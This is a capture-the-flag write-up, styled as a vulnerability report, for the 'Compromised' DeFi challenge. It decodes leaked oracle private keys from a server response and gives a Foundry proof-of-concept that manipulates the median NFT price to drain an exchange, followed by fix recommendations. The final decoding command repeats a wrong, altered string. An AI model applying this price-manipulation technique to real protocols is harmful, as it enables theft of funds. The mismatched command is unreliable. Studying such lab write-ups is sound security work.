# Compromised

While poking around a web service of one of the most popular DeFi projects in the space, you get a strange response from the server. Here's a snippet:

```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
```

A related on-chain exchange is selling (absurdly overpriced) collectibles called "DVNFT", now at 999 ETH each.

This price is fetched from an on-chain oracle, based on 3 trusted reporters: `0x188...088`, `0xA41...9D8` and `0xab3...a40`.

Starting with just 0.1 ETH in balance, pass the challenge by rescuing all ETH available in the exchange. Then deposit the funds into the designated recovery account.

# Compromised Challenge - Vulnerability Report

## Overview
The Compromised challenge demonstrates a critical vulnerability in a price oracle system that allows an attacker to manipulate NFT prices and drain funds from an exchange. The vulnerability stems from compromised private keys of trusted oracle sources, which can be derived from the leaked hex strings in the server response.

## Challenge Description
The challenge consists of:
1. A price oracle (`TrustfulOracle`) with 3 trusted sources
2. An exchange (`Exchange`) that sells NFTs based on the oracle's price
3. A leaked server response containing hex strings that encode private keys

## Vulnerability Details

### Severity: Critical
- Impact: High - Allows complete draining of the exchange
- Likelihood: High - Simple to exploit once private keys are derived
- CVSS Score: 9.0

### Location
The vulnerability exists in the `TrustfulOracle` contract, specifically in how it handles price updates from trusted sources. The private keys of these sources are leaked in the server response.

### Impact
An attacker can:
1. Decode the leaked hex strings to obtain private keys
2. Use these keys to impersonate trusted oracle sources
3. Manipulate NFT prices to drain the exchange's funds

### Root Cause
The vulnerability arises from two main issues:

1. **Compromised Private Keys**: The hex strings in the server response are base64-encoded private keys of the trusted oracle sources. These can be decoded to obtain the actual private keys.

2. **Lack of Price Validation**: The oracle accepts any price from trusted sources without validation, allowing malicious price manipulation.

## Proof of Concept

```solidity
function test_compromised() public checkSolved {
    // Decode the leaked hex strings to get private keys
    uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
    uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

    // Get the corresponding addresses
    address source1 = vm.addr(privateKey1);
    address source2 = vm.addr(privateKey2);

    // 1. Set price to 0 using both sources to ensure median is 0
    vm.startPrank(source1);
    oracle.postPrice("DVNFT", 0);
    vm.stopPrank();

    vm.startPrank(source2);
    oracle.postPrice("DVNFT", 0);
    vm.stopPrank();

    // 2. Buy NFT for almost free (1 wei)
    vm.startPrank(player);
    uint256 id = exchange.buyOne{value: 1 wei}();
    vm.stopPrank();

    // 3. Reset price to initial value using both sources
    vm.startPrank(source1);
    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
    vm.stopPrank();

    vm.startPrank(source2);
    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
    vm.stopPrank();

    // 4. Sell NFT and transfer funds to recovery
    vm.startPrank(player);
    nft.approve(address(exchange), id);
    exchange.sellOne(id);
    payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
    vm.stopPrank();
}
```

### Attack Steps
1. **Key Extraction**:
   - Decode the leaked hex strings to obtain private keys
   - Derive the corresponding source addresses

2. **Price Manipulation**:
   - Use both compromised sources to set NFT price to 0
   - This ensures the median price is 0 (controlling 2 of 3 sources)

3. **NFT Acquisition**:
   - Buy NFT for minimal cost (1 wei)
   - Store the NFT ID for later use

4. **Price Reset**:
   - Reset price to initial value using both sources
   - This ensures the median price is back to normal

5. **Fund Extraction**:
   - Approve exchange to transfer NFT
   - Sell NFT at normal price
   - Transfer all funds to recovery address

### Expected Outcome
- The exchange's balance is reduced to 0
- All ETH is transferred to the recovery address
- The player doesn't own any NFTs
- The NFT price returns to its initial value

## Recommendations

### Short-term Fix
1. Rotate all compromised private keys immediately
2. Add price validation in the oracle:
```solidity
function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) {
    require(newPrice > 0, "Price must be positive");
    require(newPrice <= MAX_PRICE, "Price exceeds maximum");
    _setPrice(msg.sender, symbol, newPrice);
}
```

### Long-term Fixes
1. Implement a more robust oracle system:
   - Add price deviation limits
   - Require multiple confirmations
   - Add time delays for price updates
2. Use a decentralized oracle network
3. Implement circuit breakers for extreme price movements
4. Add multi-signature requirements for price updates
5. Regularly rotate oracle keys

## Additional Notes
This vulnerability highlights the importance of secure key management and the risks of centralized oracle systems. The attack is possible because:
1. The oracle trusts any price from authorized sources without validation
2. The private keys were compromised and leaked
3. Controlling 2 of 3 sources allows complete price manipulation

## References
- [OpenZeppelin's AccessControl](https://docs.openzeppelin.com/contracts/4.x/api/access)
- [Oracle Security Best Practices](https://consensys.github.io/smart-contract-best-practices/development-recommendations/general/external-calls/)
- [Private Key Management](https://consensys.github.io/smart-contract-best-practices/development-recommendations/general/private-key-management/)


#Convert 

 cast --to-utf8 0x4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a5130
 output= MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0

 echo "MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0" | base64 -d



 cast --to-utf8 0x4d4867324f474a6b4d444977595751784f445a694e6a5133595459354d574d325954566a4d474d784e5449355a6a49785a574e6b4d446c6b59324d304e5449304d5451774d6d466a4e6a426959544d334e324d304d545535

 output = MHg2OGJkMDIwYWQxODZiNjQ3YTY5MWM2YTVjMGMxNTI5ZjIxZWNkMDlkY2M0NTI0MTQwMmFjNjBiYTM3N2M0MTU5

 echo "MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzU1" | base64 -d